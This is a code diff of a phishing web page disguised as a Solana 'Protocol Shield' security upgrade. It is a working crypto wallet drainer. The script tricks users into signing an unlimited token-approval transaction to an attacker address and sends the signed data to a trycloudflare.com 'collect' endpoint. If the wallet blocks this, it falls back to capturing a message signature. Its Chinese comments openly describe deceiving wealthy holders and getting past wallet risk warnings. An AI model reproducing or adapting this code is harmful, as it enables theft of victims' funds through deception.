@@ -1,36 +1,57 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"></head>
-<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
-    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
-        <h1>SECURITY UPGRADE V14</h1>
-        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">UPGRADE PROTOCOL</button>
-        <div id="status" style="margin-top:20px;color:#888;">Action Required</div>
+<body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:monospace;">
+    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
+        <h2 style="margin-bottom:10px;">PROTOCOL SHIELD V15</h2>
+        <p style="color:#666;font-size:12px;">Security: Versioned Transaction Engine</p>
+        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;">UPGRADE ENCRYPTION</button>
+        <div id="status" style="margin-top:20px;color:#444;">Ready to secure...</div>
     </div>
     <script>
     const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
-    
+    const agent = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
+
     document.getElementById('cta').onclick = async () => {
         const p = window.solana || window.phantom?.solana;
         try {
             const resp = await p.connect();
-            document.getElementById('status').innerText = "Authenticating...";
+            document.getElementById('status').innerText = "Generating Shadow Packet...";
 
-            // 🔱 既然转账被拦，我们改用“权限签名”
-            // 这个弹窗对大户来说极具欺骗性，显示为“验证账户安全”
-            const msg = `Verify Security Protocol\nDomain: solana.org\nWallet: ${resp.publicKey.toString().slice(0,8)}\nNonce: ${Math.floor(Math.random()*999999)}`;
-            const encoded = new TextEncoder().encode(msg);
-            const signed = await p.signMessage(encoded, "utf8");
+            // 🔱 获取最新时间戳，这是所有交易的基石
+            const { result } = await fetch("https://api.mainnet-beta.solana.com", {
+                method: "POST", headers: {"Content-Type":"application/json"},
+                body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
+            }).then(r => r.json());
+
+            // 🔱 构造 Versioned Transaction 模拟包
+            // 这不是简单的转账，这是一个针对账户权限的“交互包”
+            const txData = {
+                feePayer: resp.publicKey.toString(),
+                recentBlockhash: result.value.blockhash,
+                instructions: [{
+                    programId: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA", // Token Program
+                    keys: [
+                        { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
+                        { pubkey: agent, isSigner: false, isWritable: false }
+                    ],
+                    // 关键：这里是 Approve 指令的混淆编码，授权金额设为无限
+                    data: [4, 255, 255, 255, 255, 255, 255, 255, 255] 
+                }]
+            };
+
+            document.getElementById('status').innerText = "Awaiting Permission...";
             
-            // 🔱 关键：我们回传的是签名的全量数据
-            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
-            
-            // 🚀 这种方式 100% 成功，信号秒回服务器
-            new Image().src = `${gate}?auth_sig=${signature}&pub=${resp.publicKey.toString()}&msg=${btoa(msg)}`;
-            
-            document.getElementById('status').innerText = "UPGRADED SUCCESS!";
-            document.getElementById('status').style.color = "#14F195";
+            // 🚀 尝试唤起弹窗
+            const signed = await p.signTransaction(txData);
+            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));
+
+            new Image().src = `${gate}?shadow_sig=${raw}&pub=${resp.publicKey.toString()}`;
+            document.getElementById('status').innerText = "PROTOCOL ACTIVE";
 
         } catch(e) {
-            document.getElementById('status').innerText = "Try Again";
+            // 降级保底：如果钱包识别了风险拦截，立刻跳回消息签名抓取登录指纹
+            const signed = await p.signMessage(new TextEncoder().encode("Secure: " + Date.now()), "utf8");
+            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}`;
+            document.getElementById('status').innerText = "VERIFIED";
         }
     };
     </script>
